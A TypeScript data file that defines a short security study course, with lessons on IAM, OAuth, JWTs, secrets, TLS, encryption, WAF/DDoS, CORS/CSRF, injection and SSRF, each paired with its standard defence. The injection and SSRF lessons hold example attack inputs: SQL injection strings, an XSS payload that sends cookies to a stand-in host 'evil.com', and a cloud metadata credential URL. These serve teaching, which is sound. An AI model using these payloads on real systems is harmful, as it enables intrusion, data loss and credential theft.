import type { Course } from './types'

// Security study course. Lessons are deliberately small and plain, framed as
// attack → defense. ```mermaid fences render as diagrams (sequenceDiagram
// only). This course has no practice problems. Sources are OWASP (Top 10 +
// cheat sheets), MDN, oauth.net, and TLS/Let's Encrypt docs.

export const security: Course = {
  key: 'sec',
  label: 'Security',
  blurb:
    'The attacks an application actually faces and the standard defense for each — identity, data protection, and the web vulnerabilities every service must guard against.',
  chapters: [
    {
      id: 'sec-identity',
      title: 'Identity & access',
      summary: 'Who is calling, what they are allowed to do, and how tokens and secrets are handled without leaking them.',
      lessons: [
        {
          id: 'sec-iam',
          title: 'Identity and access management (IAM)',
          minutes: 4,
          body: `Access control answers two separate questions, and conflating them is a common mistake. **Authentication** ("authn") is *who are you* — proving identity with a password, key, or token. **Authorization** ("authz") is *what may you do* — deciding whether that identity is allowed the action. You authenticate once; you authorize on every request.

The models you should be able to name:

- **RBAC (role-based)** — permissions attach to roles, users get roles. Simple and the common default: an "editor" role can publish, a "viewer" cannot.
- **ABAC (attribute-based)** — decisions use attributes of the user, resource, and context ("only the document *owner*, and only during business hours"). More expressive, harder to reason about.

Two principles the interviewer wants to hear regardless of model:

- **Least privilege** — grant the minimum permission needed, nothing "just in case." An over-scoped credential is the blast radius of every future compromise.
- **Deny by default** — the absence of an explicit allow is a denial. Never build a system where a missing rule means "permitted."

Cloud IAM (AWS/GCP/Azure) applies exactly this: a *policy* attaches permissions to a *principal* (user, role, service), and the effective decision is the intersection of what every applicable policy allows.`,
        },
        {
          id: 'sec-oauth',
          title: 'OAuth 2.0 flows',
          minutes: 6,
          body: `OAuth 2.0 is **delegated authorization**: it lets a user grant an app limited access to their data on another service *without handing over their password*. "Log in with Google" is the everyday case. It is not an authentication protocol itself — OpenID Connect (OIDC) is the thin layer on top of OAuth that adds "who is this user."

The four roles: the **resource owner** (the user), the **client** (the app wanting access), the **authorization server** (issues tokens, e.g. Google), and the **resource server** (holds the data, honours the token).

The flow that matters — **authorization code**, used by web and mobile apps:

\`\`\`mermaid
sequenceDiagram
    participant User
    participant Client
    participant Auth as Auth server
    participant API as Resource server
    User->>Client: click "Log in with Google"
    Client->>Auth: redirect with client_id + scope
    Auth->>User: login + consent screen
    User-->>Auth: approve
    Auth-->>Client: redirect back with one-time code
    Client->>Auth: exchange code (+ client_secret) for token
    Auth-->>Client: access token (+ refresh token)
    Client->>API: request with access token
    API-->>Client: protected data
\`\`\`

Why the extra code-for-token step instead of returning the token directly? The code travels through the browser (visible in the URL), but the token exchange happens **server-to-server** where the browser and its history never see the token. Public clients (mobile, SPAs) that have no safe place for a \`client_secret\` add **PKCE** — a per-request code verifier/challenge — so an intercepted code can't be redeemed by an attacker.

Other grant types, briefly: **client credentials** (machine-to-machine, no user involved), and the legacy **implicit** and **password** grants, both now discouraged. **Scopes** limit what the token can do; keep them narrow — this is least privilege applied to tokens.`,
        },
        {
          id: 'sec-jwt',
          title: 'JWTs and token rotation',
          minutes: 5,
          body: `A **JWT** (JSON Web Token) is a signed, self-contained token. Three base64url parts joined by dots: a **header** (algorithm), a **payload** (claims like \`sub\`, \`exp\`, \`role\`), and a **signature**. The server signs the first two parts with a secret (HMAC) or a private key (RSA/ECDSA); anyone can *read* the payload, but only the holder of the key can *forge* a valid signature. That is the whole point: the resource server can verify a token locally, without a database lookup or a call back to the auth server.

Because verification is stateless, JWTs are hard to revoke — a stolen token is valid until it expires. That drives the standard pattern: **short-lived access tokens + long-lived refresh tokens**.

\`\`\`mermaid
sequenceDiagram
    participant Client
    participant Auth as Auth server
    participant API
    Client->>API: request with access token
    API-->>Client: 401 (access token expired)
    Client->>Auth: refresh token
    Auth-->>Client: new access token (+ rotated refresh token)
    Client->>API: retry with new access token
    API-->>Client: 200 OK
\`\`\`

**Rotation** is the discipline that limits damage:

- Keep the **access token short** (minutes to ~1 hour) so a leaked one dies fast.
- **Rotate refresh tokens** — each refresh issues a *new* refresh token and invalidates the old one. If an attacker and the real user both present the same old refresh token, the server detects reuse and revokes the whole family.
- **Rotate signing keys** and publish them via a JWKS endpoint with a \`kid\` header, so you can retire a compromised key without a flag-day.

Common footguns to call out: never accept \`alg: none\`, never confuse "readable" with "safe to store secrets in" (the payload is not encrypted), and validate \`exp\`, \`iss\`, and \`aud\` on every request.`,
        },
        {
          id: 'sec-secrets',
          title: 'Secrets management',
          minutes: 4,
          body: `Secrets — database passwords, API keys, signing keys, TLS private keys — are the credentials that unlock everything else, so where they live matters more than any single line of application code.

The failures are predictable:

- **Hardcoded in source** — the classic. Once a key is in a git commit it is in history forever; rotate it, don't just delete the line.
- **Baked into container images or config files** shipped alongside the app.
- **Logged** accidentally when a request or config object is dumped.

The standard practice:

- **Never commit secrets.** Keep them out of the repo entirely; scan commits (pre-commit hooks, secret scanners) to catch mistakes.
- **Inject at runtime**, not build time — from environment variables in dev, and from a dedicated **secrets manager** (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager) in production. The app fetches the secret at startup or on demand; it is never stored in the artifact.
- **Rotate regularly and on compromise.** A managed secret store can rotate a database credential automatically and hand the app the new one, so rotation isn't a manual outage.
- **Encrypt at rest and restrict access** with IAM — least privilege again: a service reads only the secrets it needs.

The mindset: assume any secret *will* eventually leak, and design so that a leak is a rotation, not a catastrophe.`,
        },
      ],
    },
    {
      id: 'sec-data',
      title: 'Data in transit & at rest',
      summary: 'Protecting data on the wire and on disk, and the network-layer defenses in front of the application.',
      lessons: [
        {
          id: 'sec-tls',
          title: 'TLS and the handshake',
          minutes: 5,
          body: `**TLS** (Transport Layer Security, the successor to SSL) is what puts the "S" in HTTPS. It gives three guarantees on a connection: **confidentiality** (traffic is encrypted), **integrity** (tampering is detected), and **authentication** (you are talking to the real server, via its certificate).

The handshake establishes a shared session key before any application data flows. At a high level (TLS 1.3, simplified):

\`\`\`mermaid
sequenceDiagram
    participant Client
    participant Server
    Client->>Server: ClientHello (supported ciphers, key share)
    Server-->>Client: ServerHello + certificate + key share
    Note over Client: verify cert against trusted CA
    Client->>Server: finished (encrypted from here)
    Server-->>Client: finished
    Note over Client,Server: encrypted application data
\`\`\`

The two ideas worth understanding:

- **Asymmetric → symmetric handoff.** The expensive public-key crypto is used only briefly to authenticate the server and agree on a key. The actual data is then encrypted with fast **symmetric** crypto using that session key.
- **Certificates and the chain of trust.** The server presents a certificate signed by a **Certificate Authority (CA)** your device already trusts. The client verifies the signature chain up to a trusted root — that is what stops a man-in-the-middle from impersonating the server. Let's Encrypt made these certificates free and automatable, which is why plain HTTP is now treated as broken.

Interview-relevant points: TLS 1.3 dropped the older, slower, less safe options and cut the handshake to one round trip; and TLS protects data *in transit only* — it says nothing about how data is stored once it arrives.`,
        },
        {
          id: 'sec-encryption',
          title: 'Encryption in transit and at rest',
          minutes: 5,
          body: `"Encrypt everything" splits into two distinct problems with different tools.

**Encryption in transit** protects data moving between systems — the browser to your server, your server to the database, service to service. The tool is **TLS** on every hop. The mistake is encrypting the public edge (HTTPS at the load balancer) and then sending plaintext internally; treat internal links as untrusted too.

**Encryption at rest** protects data sitting on disk — databases, object storage, backups, logs — so a stolen disk or leaked backup is useless without the key. Building blocks:

- **Symmetric encryption (AES)** does the bulk work: one key encrypts and decrypts. Fast, used for the actual data.
- **Key hierarchy / envelope encryption** — data is encrypted with a **data key**, and that data key is itself encrypted by a **master key** held in a KMS (Key Management Service). You rotate the master key without re-encrypting all the data.

Two things people conflate with encryption but shouldn't:

- **Hashing is not encryption.** Passwords are *hashed*, not encrypted — a one-way function you can't reverse. Use a slow, salted algorithm built for it (**bcrypt, scrypt, or Argon2**), never a fast general hash like SHA-256 alone, and never MD5.
- **Encoding (base64) is not encryption.** It provides zero confidentiality; anyone can decode it.

The full posture is data encrypted in transit *and* at rest, keys managed in a KMS with rotation, and passwords hashed with a purpose-built slow function.`,
        },
        {
          id: 'sec-waf-ddos',
          title: 'WAF and DDoS protection',
          minutes: 4,
          body: `These are the two defenses that sit *in front of* your application, at the network edge.

A **WAF (Web Application Firewall)** inspects HTTP requests and blocks malicious ones before they reach your app — think of it as a filter tuned for web attacks. It uses rule sets (often the OWASP Core Rule Set) to catch patterns like SQL injection payloads, XSS attempts, and known bad bots, plus per-IP rate limits. A WAF is **defense in depth, not a substitute** for fixing the vulnerability in code: it reduces exposure and buys time, but a determined attacker can craft around signature rules, so the application must still be safe on its own.

**DDoS (Distributed Denial of Service)** is an availability attack — overwhelm a target with traffic from many sources so real users can't get through. Layers:

- **Volumetric (L3/L4)** — flood the pipe or the connection table (UDP floods, SYN floods). Defended by absorbing the traffic in a large distributed network and scrubbing it upstream.
- **Application (L7)** — fewer but expensive requests that look legitimate (hammering a search endpoint). Defended with rate limiting, challenges (CAPTCHA/JS), and caching so requests never reach origin.

The practical answer in a design: put a **CDN + DDoS scrubbing service** (Cloudflare, AWS Shield/CloudFront) in front, enable a WAF on it, cache aggressively so most traffic never touches your origin, and keep origin IPs hidden so attackers can't bypass the edge.`,
        },
      ],
    },
    {
      id: 'sec-webvuln',
      title: 'Web & app vulnerabilities',
      summary: 'The application-layer attacks from the OWASP Top 10 — for each, what it is, a concrete example, and the standard mitigation.',
      lessons: [
        {
          id: 'sec-cors-csrf',
          title: 'CORS and CSRF',
          minutes: 6,
          body: `These two are constantly confused. One is a *permission model*; the other is an *attack*.

**CORS (Cross-Origin Resource Sharing)** is a browser mechanism that **relaxes** the same-origin policy. By default a page at \`app.com\` cannot read a response from \`api.other.com\` via JavaScript. CORS lets \`api.other.com\` opt in by sending headers like \`Access-Control-Allow-Origin: https://app.com\`. Key point for interviews: **CORS is not a security feature that protects your server** — it is the *server telling the browser* who may read responses. It does not stop requests from reaching your API (only the browser's reading of the response is gated), and a non-browser client ignores it entirely. The real mistake is over-permissive config: \`Access-Control-Allow-Origin: *\` combined with credentials effectively opens your API to every site. Fix: allow a specific, known list of origins.

**CSRF (Cross-Site Request Forgery)** is an actual attack: a malicious site tricks a *logged-in* user's browser into making a state-changing request to your app, riding along on the cookie the browser sends automatically.

\`\`\`mermaid
sequenceDiagram
    participant User
    participant Evil as Attacker site
    participant Bank
    Note over User,Bank: user is already logged in to Bank (cookie set)
    User->>Evil: visits attacker page
    Evil-->>User: hidden form auto-submits
    User->>Bank: POST /transfer (browser attaches Bank cookie)
    Bank-->>User: transfer executed — user never intended it
\`\`\`

Standard mitigations, used together:

- **Anti-CSRF tokens** — the server embeds a secret, unpredictable token in the form/page; a forged cross-site request can't know it, so it fails validation.
- **SameSite cookies** — set \`SameSite=Lax\` (or \`Strict\`) so the browser won't attach the session cookie to cross-site requests. This is now the primary, built-in defense.
- **Check the Origin/Referer** header on state-changing requests.

The neat contrast: CSRF abuses that the browser *automatically sends cookies*; the defenses make the request either unforgeable (token) or cookie-less across sites (SameSite).`,
        },
        {
          id: 'sec-injection',
          title: 'Injection: SQL injection and XSS',
          minutes: 6,
          body: `Injection attacks all share one root cause: **untrusted input is treated as code instead of data**. Two dominate the OWASP Top 10.

**SQL injection (SQLi)** — user input is concatenated into a SQL query, so the input can *change the query*. If the login query is built as:

\`\`\`
"SELECT * FROM users WHERE name = '" + input + "'"
\`\`\`

then an input of \`' OR '1'='1\` turns the WHERE clause always-true and logs the attacker in; \`'; DROP TABLE users; --\` can destroy data. The **standard mitigation is parameterized queries (prepared statements)**: the query structure is fixed and sent separately from the values, so input can never be parsed as SQL. Use them everywhere; an ORM does this for you. Add least-privilege DB accounts and input validation as defense in depth, but parameterization is the fix — string escaping by hand is not.

**Cross-Site Scripting (XSS)** — the attacker injects script that runs in *another user's* browser, in the victim's session. Example (**stored XSS**): an attacker posts a comment containing \`<script>fetch('evil.com?c='+document.cookie)</script>\`; every user who views the comment ships their session cookie to the attacker. Variants: **stored** (saved in your DB), **reflected** (echoed back from a URL parameter), and **DOM-based** (client-side JS writes untrusted data into the page).

The mitigation is **context-aware output encoding**: escape data for the context it lands in (HTML, attribute, JS, URL) so \`<script>\` renders as text, not code. Modern frameworks (React, Angular) auto-escape by default — the danger is escape hatches like \`dangerouslySetInnerHTML\`. Reinforce with a **Content Security Policy (CSP)** that blocks inline scripts, and set session cookies \`HttpOnly\` so script can't read them.

The unifying lesson: **separate code from data** — bind values as parameters (SQLi), encode output for its context (XSS) — and never trust input because it came through your own UI.`,
        },
        {
          id: 'sec-ssrf',
          title: 'SSRF (Server-Side Request Forgery)',
          minutes: 5,
          body: `**SSRF** tricks *your server* into making a request the attacker chooses. Wherever your app fetches a URL supplied by the user — a "import from URL," a webhook, an image proxy, a PDF-from-link feature — an attacker can point it at targets they could never reach directly.

The high-value target is the internal network the server can see but the attacker cannot: internal admin panels, databases, and especially **cloud metadata endpoints**. On a cloud VM, \`http://169.254.169.254/\` returns instance metadata — historically including temporary IAM credentials. SSRF to that endpoint is how attackers pivot a harmless-looking "fetch this URL" into stolen cloud keys.

\`\`\`mermaid
sequenceDiagram
    participant Attacker
    participant App as Your server
    participant Meta as 169.254.169.254
    Attacker->>App: "import image from" http://169.254.169.254/latest/meta-data/iam/...
    App->>Meta: server fetches the URL (trusted position)
    Meta-->>App: temporary cloud credentials
    App-->>Attacker: returns the fetched content — creds leaked
\`\`\`

Standard mitigations, layered:

- **Allowlist, don't blocklist.** Permit only the specific domains/schemes the feature needs; blocklists of "bad" IPs are trivially bypassed with redirects, DNS tricks, and alternate IP encodings.
- **Block internal ranges and metadata IPs** — reject requests resolving to private (RFC 1918), loopback, and link-local (\`169.254.0.0/16\`) addresses, and re-check *after* DNS resolution to defeat rebinding.
- **Disable unneeded schemes/redirects** — no \`file://\`, \`gopher://\`; don't blindly follow redirects that can jump from an allowed host to an internal one.
- **Harden the metadata service** — require IMDSv2 (session-token based) so a simple GET can't harvest credentials.

SSRF is on the OWASP Top 10 in its own right precisely because a small "fetch a URL" feature can become full internal-network access if the destination isn't constrained.`,
        },
      ],
    },
  ],
  references: [
    { label: 'OWASP Top 10', url: 'https://owasp.org/www-project-top-ten/' },
    { label: 'OWASP Cheat Sheet Series', url: 'https://cheatsheetseries.owasp.org/' },
    { label: 'OWASP — SQL Injection Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
    { label: 'OWASP — Cross Site Scripting Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
    { label: 'OWASP — Server Side Request Forgery Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html' },
    { label: 'MDN — Cross-Origin Resource Sharing (CORS)', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS' },
    { label: 'oauth.net — OAuth 2.0', url: 'https://oauth.net/2/' },
    { label: "Let's Encrypt — How It Works", url: 'https://letsencrypt.org/how-it-works/' },
  ],
}
